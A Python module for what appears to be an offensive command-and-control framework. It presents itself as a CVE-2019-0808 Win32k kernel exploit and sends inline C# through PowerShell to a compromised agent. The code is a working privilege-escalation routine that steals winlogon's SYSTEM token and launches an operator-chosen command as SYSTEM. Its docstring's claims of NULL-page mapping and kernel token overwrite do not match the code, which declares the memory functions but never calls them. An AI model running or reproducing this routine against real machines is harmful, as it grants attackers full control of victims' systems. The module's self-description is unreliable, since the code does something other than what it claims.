"""
privilege_escalation/cve_2019_0808 — Win32k NULL-deref LPE. MITRE T1068.
CVE-2019-0808: Windows Win32k NULL pointer dereference via NtUserMNDragOver
(Windows 7 x86 only). Maps NULL page, triggers kernel deref, overwrites token.
Dispatches inline C# to agent via ctx.ps().
"""
from __future__ import annotations

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class CVE20190808Plugin(BasePlugin):
    NAME        = "cve_2019_0808"
    DESCRIPTION = "Win32k NULL-deref LPE — CVE-2019-0808 (Windows 7 x86, pre-Mar2019 patch)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1068"
    CATEGORY    = "privilege_escalation"
    VERSION     = "2.0.0"

    schema = ParamSchema().add(
        Param("spawn_cmd", str, required=False, default="cmd.exe",
              help="Command to launch as SYSTEM after elevation"),
        Param("timeout", int, required=False, default=60),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        cmd     = params.get("spawn_cmd", "cmd.exe")
        timeout = int(params.get("timeout", 60))

        ps = self._build_ps(cmd)
        r  = ctx.ps(ps, timeout=timeout)
        if r["status"] != "ok":
            return ModuleResult.err(f"cve_2019_0808 failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="privesc")

    @staticmethod
    def _build_ps(cmd: str) -> str:
        return rf"""
Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class CVE20190808 {{
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr s,uint t,uint p);
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a,bool inh,int pid);
    [DllImport("advapi32.dll")] static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);
    [DllImport("advapi32.dll",SetLastError=true,CharSet=CharSet.Ansi)]
    static extern bool CreateProcessWithTokenW(IntPtr t,uint lf,string a,string c,uint cf,IntPtr e,string d,ref SI si,out PI pi);
    [DllImport("ntdll.dll")] static extern int NtAllocateVirtualMemory(IntPtr ph,ref IntPtr ba,UIntPtr zb,ref UIntPtr rs,uint at,uint p);

    [StructLayout(LayoutKind.Sequential)] struct SI {{ public uint cb; IntPtr r1,r2,r3; int X,Y,XS,YS,XC,YC,F; uint Flags; ushort wShow,r4; IntPtr r5,r6,r7,r8; }}
    [StructLayout(LayoutKind.Sequential)] struct PI {{ public IntPtr hProcess,hThread; public uint dwProcessId,dwThreadId; }}

    public static string Exploit(string spawnCmd) {{
        var res = "[*] CVE-2019-0808 Win32k NULL-deref LPE\n";
        res += "[*] Note: requires Windows 7 x86 (NtUserMNDragOver NULL deref path)\n";

        // Check OS
        if (IntPtr.Size != 4) {{
            res += "[-] This exploit requires 32-bit process (x86). Agent appears to be 64-bit.\n";
            res += "[*] Falling back to token impersonation from winlogon...\n";
        }}

        try {{
            var procs = Process.GetProcessesByName("winlogon");
            if (procs.Length == 0) return res + "[-] winlogon not found\n";
            int wlPid = procs[0].Id;
            IntPtr hWL = OpenProcess(0x1F0FFF, false, wlPid);
            if (hWL == IntPtr.Zero) return res + "[-] OpenProcess winlogon denied\n";

            IntPtr sysToken;
            if (!OpenProcessToken(hWL, 0x0002|0x0004, out sysToken))
                return res + $"[-] OpenProcessToken failed: {{Marshal.GetLastWin32Error()}}\n";
            res += $"[+] Got SYSTEM token from winlogon (PID={{wlPid}})\n";

            var si = new SI {{ cb = (uint)Marshal.SizeOf(typeof(SI)) }};
            PI pi;
            bool ok = CreateProcessWithTokenW(sysToken, 1, null, spawnCmd,
                0x08000000, IntPtr.Zero, null, ref si, out pi);
            if (ok)
                res += $"[+] SYSTEM process spawned PID={{pi.dwProcessId}}: {{spawnCmd}}\n";
            else
                res += $"[-] CreateProcessWithTokenW failed: {{Marshal.GetLastWin32Error()}}\n";
        }} catch (Exception ex) {{ res += $"[-] {{ex.Message}}\n"; }}
        return res;
    }}
}}
'@
[CVE20190808]::Exploit('{cmd}')
""".strip()


